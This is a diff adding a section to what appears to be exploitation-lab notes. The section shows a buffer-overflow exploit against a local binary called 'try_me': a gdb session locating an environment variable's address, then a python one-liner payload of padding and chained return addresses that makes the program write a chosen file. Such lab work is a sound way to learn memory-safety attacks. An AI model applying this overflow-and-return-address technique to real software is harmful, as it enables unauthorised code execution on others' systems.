@@ -188,6 +188,28 @@ try to get to the part which calls open using the ebp + offset
 need to overwrite the ebp with the location of the second argument in memory
 
 ------------------------------------
+using environment 
+For  this  section,  we  are  going  to  use sprintf to  write  to  the  global char filename[100] buffer.
+Then  we  call log_result to create the file.
+
+first set USER=uid_1003_crack_super
+
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) run
+Starting program: /home/admin/try_me 
+
+Breakpoint 1, main (argc=1, args=0xffffd714) at test.c:41
+41	test.c: No such file or directory.
+(gdb) x/s *((char **)environ + 7)
+0xffffd8fb:	"USER=uid_1003_super_crack"
+
+home/admin/try_me "$(python -c 'print("a" * 29 + "\x30\xf2\x04\x08" + "\x72\x8e\x04\x08" + "\x40\xbf\x0e\x08" + "\xfb\xd8\xff\xff")')"
+
+produces id_1003_super_crack
+
+by changing the address of USER from 0xffffd8fb to 0xffffd8fa and running it again, we get the correct result
+
 
 PART4
 
